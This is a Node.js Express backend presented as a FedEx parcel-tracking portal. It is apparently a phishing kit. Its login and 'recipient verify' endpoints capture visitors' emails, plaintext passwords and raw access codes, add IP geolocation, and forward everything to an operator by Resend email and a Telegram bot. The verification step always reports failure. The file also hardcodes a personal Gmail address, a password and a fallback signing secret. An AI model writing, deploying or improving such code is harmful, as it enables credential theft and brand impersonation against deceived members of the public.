require('dotenv').config();

const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const useragent = require('useragent');
const https = require('https');
const fetch = require('node-fetch');
const { Resend } = require('resend');  // ✅ NEW: Resend for email

const app = express();

// ✅ NEW: Resend client (no more Nodemailer!)
const resend = new Resend(process.env.RESEND_API_KEY);

const allowedOrigins = [
  'http://localhost:3000',
  'https://*.vercel.app',
  'https://fedex-parcel-tracking.vercel.app'
];

const PORT = process.env.PORT || 8080;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "fedex_tracker_secret_2025";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({
  origin: function (origin, callback) {
    if (!origin ||
        allowedOrigins.includes(origin) ||
        origin.match(/https:\/\/.*\.vercel\.app$/)) {
      return callback(null, true);
    }
    return callback(new Error('CORS blocked'), false);
  },
  credentials: true
}));

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

const USER = {
  id: 1,
  email: "egli79380@gmail.com",
  password: "password123_zMq-h5*wE-FdUk"
};

let otpStore = {};

function getClientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
    || req.connection?.remoteAddress
    || req.socket?.remoteAddress
    || req.connection?.socket?.remoteAddress
    || "unknown";
}

async function getLocationFromIp(ip) {
  return new Promise((resolve) => {
    https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, (resp) => {
      let data = '';
      resp.on('data', chunk => data += chunk);
      resp.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (response.status === 'success') {
            resolve(`${response.city}, ${response.regionName}, ${response.country}`);
          } else {
            resolve('Location unavailable');
          }
        } catch (e) {
          resolve('Location error');
        }
      });
    }).on('error', () => resolve('Location error'));
  });
}

async function sendTelegramAlert(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
  } catch (e) {
    console.error('Telegram error:', e);
  }
}

// 🚨 INTRUDER MONITOR - Logs EVERY click/attempt
app.post('/api/log-action', async (req, res) => {
  try {
    const logData = req.body;
    const ip = getClientIp(req);
    const locationInfo = await getLocationFromIp(ip);

    const alertMailText = `🚨 FED EX TRACKER - ${String(logData.action || '').toUpperCase()}
═══════════════════════════════════════════════
ACTION: ${logData.action}
SECTION: ${logData.currentAction || 'N/A'}
EMAIL: ${logData.email || 'none'}
TRACKING (masked): ${logData.trackingInputMasked || 'none'}
CODE LEN: ${logData.codeLength || 'N/A'}
ATTEMPTS: ${logData.totalAttempts || logData.attempt || 1}
${logData.intruderDetected ? '🚨 INTRUDER DETECTED - 5th ATTEMPT!' : ''}
IP: ${logData.ip || ip}
CITY: ${logData.city || 'unknown'}
COUNTRY: ${logData.country || 'unknown'}
LOCATION: ${locationInfo}
BROWSER: ${(logData.userAgent || '').substring(0, 120)}...
URL: ${logData.url}
TIME: ${logData.timestamp || new Date().toISOString()}
EXTRA: ${JSON.stringify(logData, null, 2)}
═══════════════════════════════════════════════`;

    // ✅ RESEND: Replace Nodemailer
    await resend.emails.send({
      from: 'FedEx Tracker <noreply@resend.dev>',  // Use Resend's default or your verified domain
      to: [adminEmail],
      subject: `🚨 FedEx Tracker ${String(logData.action || '').toUpperCase()} (${logData.city || '?'} ${logData.country || '?'})${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
      text: alertMailText
    });

    // Minimal Telegram alert
    const tgText = `FedEx tracker action: ${logData.action} | email: ${logData.email || 'none'} | ip: ${logData.ip || ip} | at: ${logData.timestamp || new Date().toISOString()}`;
    sendTelegramAlert(tgText);

    res.json({ success: true });
  } catch (error) {
    console.error('log-action error:', error);
    res.status(500).json({ success: false });
  }
});

// Login endpoint
app.post('/api/login', async (req, res) => {
  const { email, password, loginUrl, browser, ipDetails } = req.body;
  const ip = getClientIp(req);
  const locationInfo = await getLocationFromIp(ip);

  const alertMailText = `🔐 FedEx Login Attempt
Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${locationInfo}
Browser: ${browser || req.headers['user-agent']}
URL: ${loginUrl || req.headers.referer || 'unknown'}`;

  // ✅ RESEND: Replace Nodemailer
  await resend.emails.send({
    from: 'FedEx Tracker <noreply@resend.dev>',
    to: [adminEmail],
    subject: '🔐 FedEx Login Attempt',
    text: alertMailText
  });

  const tgText = `FedEx login attempt: email=${email} ip=${ip} time=${new Date().toISOString()}`;
  sendTelegramAlert(tgText);

  if (email === USER.email && password === USER.password) {
    const otp = crypto.randomInt(100000, 999999).toString();
    otpStore[email] = { otp, created: Date.now() };

    // ✅ RESEND: OTP email
    await resend.emails.send({
      from: 'FedEx Tracker <noreply@resend.dev>',
      to: [email],
      subject: 'FedEx Secure OTP Code',
      text: `Your OTP: ${otp} (expires in 15 min)`
    });

    return res.json({ success: true, message: 'OTP sent' });
  } else {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// ✅ NEW: /api/verify-recipient with RAW PASSCODE
app.post('/api/verify-recipient', async (req, res) => {
  const { email, code } = req.body;
  const ip = getClientIp(req);
  const locationInfo = await getLocationFromIp(ip);

  const mailText = `🔐 FedEx Secure Portal - Recipient Verify
Email: ${email}
**ACCESS CODE**: ${code || '[empty]'}  // ← RAW CODE SENT HERE
Access code length: ${code ? code.length : 0}
IP: ${ip}
Location: ${locationInfo}
Time: ${new Date().toISOString()}`;

  // ✅ RESEND: Email to admin WITH RAW CODE
  await resend.emails.send({
    from: 'FedEx Tracker <noreply@resend.dev>',
    to: [adminEmail],
    subject: '🔐 FedEx Secure Recipient Verification Attempt',
    text: mailText
  });

  // Telegram alert (minimal)
  const tgText = `Recipient verify: email=${email} ip=${ip} time=${new Date().toISOString()}`;
  sendTelegramAlert(tgText);

  return res.json({ ok: false });  // Fixed: was { true: false }
});

app.post('/api/verify-otp', (req, res) => {
  const { email, otp } = req.body;
  const record = otpStore[email];
  
  if (record && record.otp === otp && (Date.now() - record.created) < 15*60*1000) {
    delete otpStore[email];
    const token = jwt.sign({ id: USER.id, email }, SECRET, { expiresIn: '2h' });
    res.json({ success: true, token });
  } else {
    res.status(401).json({ success: false, message: 'Invalid/expired OTP' });
  }
});

app.get('/health', (req, res) => res.json({ status: 'OK' }));

app.listen(PORT, () => {
  console.log(`🚀 Backend on port ${PORT}`);
});
